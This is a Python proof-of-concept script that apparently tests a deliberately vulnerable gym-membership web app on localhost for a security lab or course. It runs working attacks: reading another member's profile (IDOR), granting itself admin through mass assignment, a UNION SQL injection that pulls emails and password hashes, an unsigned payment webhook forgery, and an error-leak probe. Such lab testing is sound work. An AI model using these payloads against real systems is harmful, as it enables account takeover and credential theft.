import requests
import json

BASE_URL = "http://localhost:5000"
session = requests.Session()

print("="*60)
print("🔥 Starting PulseGym Security Assessment (PoC) 🔥")
print("="*60)

# 1. Login as Sara (Normal Member)
print("\n[+] 1. Logging in as Sara (Normal Member)...")
login_data = {"email": "sara@pulsegym.test", "password": "sara12345"}
r = session.post(f"{BASE_URL}/api/login", json=login_data)
print(f"Status: {r.status_code} | Response: {r.json()}")
if r.status_code != 200:
    print("[-] Login failed. Make sure the app is running and DB is seeded.")
    exit()

# 2. Test IDOR (Read Omar's Profile)
print("\n[+] 2. Testing IDOR: Sara trying to read Omar's profile (ID: 2)...")
r = session.get(f"{BASE_URL}/api/members/2")
print(f"Status: {r.status_code}")
if r.status_code == 200:
    print(f"Vulnerable Data Leaked: {r.json()}")
    print("🚨 VULNERABLE: IDOR found! Sara can read other members' data.")
else:
    print("✅ SECURE: IDOR is blocked.")

# 3. Test Privilege Escalation (Mass Assignment)
print("\n[+] 3. Testing Privilege Escalation: Sara trying to make herself Admin...")
update_data = {"role": "admin", "membership_paid": 1}
r = session.put(f"{BASE_URL}/api/members/1", json=update_data)
print(f"Status: {r.status_code} | Response: {r.json()}")
if r.status_code == 200 and r.json().get("role") == "admin":
    print("🚨 VULNERABLE: Privilege Escalation found! Sara is now an Admin.")
    # Verify admin access
    r_admin = session.get(f"{BASE_URL}/api/admin/members")
    print(f"Testing Admin Endpoint (Status: {r_admin.status_code})")
else:
    print("✅ SECURE: Privilege Escalation is blocked.")

# 4. Test SQL Injection (Advanced PoC with UNION)
print("\n[+] 4. Testing SQL Injection on Search...")
# Payload to extract admin email and password hash from members table
# We use UNION SELECT to match the 5 columns of the classes table (id, name, coach, starts_at, capacity)
sqli_payload = "' UNION SELECT id, email, password_hash, 'x', 'x' FROM members --"
r = session.get(f"{BASE_URL}/api/classes", params={"search": sqli_payload})
print(f"Status: {r.status_code}")

if r.status_code == 200 and len(r.json()) > 0:
    # Check if we actually got member data
    if "email" in str(r.json()).lower() or "@" in str(r.json()):
        print("🚨 VULNERABLE: SQL Injection found! Extracted Admin Credentials:")
        for row in r.json():
            # The email is mapped to 'name' and hash to 'coach' based on our UNION query
            if "@" in str(row.get('name')):
                print(f"    -> Email: {row.get('name')} | Hash: {row.get('coach')}")
    else:
        print("✅ SECURE: SQL Injection payload failed to return leaked data.")
else:
    print("✅ SECURE: SQL Injection is blocked.")

# 5. Test Payment Webhook Bypass (No signature)
print("\n[+] 5. Testing Payment Webhook Bypass...")
webhook_data = {"member_id": 2, "status": "paid"} # Omar
r = session.post(f"{BASE_URL}/api/payments/webhook", json=webhook_data)
print(f"Status: {r.status_code} | Response: {r.json()}")
if r.status_code == 200:
    print("🚨 VULNERABLE: Webhook Bypass found! Changed payment status without valid signature.")
    # Check if Omar is now paid
    r_check = session.get(f"{BASE_URL}/api/members/2")
    if r_check.status_code == 200:
        print(f"Omar's current payment status: {r_check.json().get('membership_paid')}")
else:
    print("✅ SECURE: Webhook rejects requests without valid signature.")

# 6. Test Information Disclosure (Error Handling)
print("\n[+] 6. Testing Information Disclosure via Error...")
# Send invalid JSON to trigger an error
r = session.post(f"{BASE_URL}/api/login", data="invalid_json", headers={"Content-Type": "application/json"})
print(f"Status: {r.status_code}")
if "trace" in r.text or "db" in r.text:
    print("🚨 VULNERABLE: Information Disclosure found! Traceback and DB path leaked.")
    print(f"Leaked Response: {r.text[:150]}...")
else:
    print("✅ SECURE: Error handling is safe (no traceback leaked).")

print("\n" + "="*60)
print("🎯 Assessment Completed.")
print("If you are on the VULNERABLE version, take a screenshot for your report.")
print("If you are on the FIXED version, all tests above should show '✅ SECURE'.")
print("="*60)

